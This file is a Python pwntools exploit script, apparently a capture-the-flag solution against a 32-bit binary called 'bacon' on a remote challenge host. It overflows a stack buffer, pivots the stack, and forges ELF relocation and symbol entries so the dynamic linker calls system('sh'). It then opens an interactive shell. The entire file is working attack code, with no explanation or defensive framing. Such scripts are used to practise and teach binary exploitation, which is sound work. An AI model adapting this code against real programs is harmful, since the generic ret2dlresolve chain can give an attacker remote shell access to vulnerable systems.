#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./bacon')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50032)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

# -- Exploit goes here --

io = start()

resolver = 0x8049030  
buf = 0x804ca00  
leave_ret = 0x08049126  
SYMTAB = 0x804820c
STRTAB = 0x80482ec
JMPREL = 0x8048408

buffer = b""
buffer += b"A"*0x408
buffer += p32(buf)   
buffer += p32(exe.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) + b'AAAAAAAAAAAA'
print(hex(len(buffer)))

forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8 

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) 

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) // 0x10

r_info = (index_sym << 8) | 0x7 

elf32_rel = p32(exe.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)


buffer2 = b'AAAA'              
buffer2 += p32(resolver)       
buffer2 += p32(rel_offset)     
buffer2 += b'AAAA'              
buffer2 += p32(buf+100)        
buffer2 += elf32_rel           
buffer2 += b'A' * align
buffer2 += elf32_sym_struct    
buffer2 += b"system\x00"
p = (100 - len(buffer2))
buffer2 += b'A' * p              
buffer2 += b"sh\x00"
p = (0x80 - len(buffer2))
buffer2 += b"A" * p              
pause()
io.send(buffer+buffer2)
#io.send(buffer2)
io.interactive()
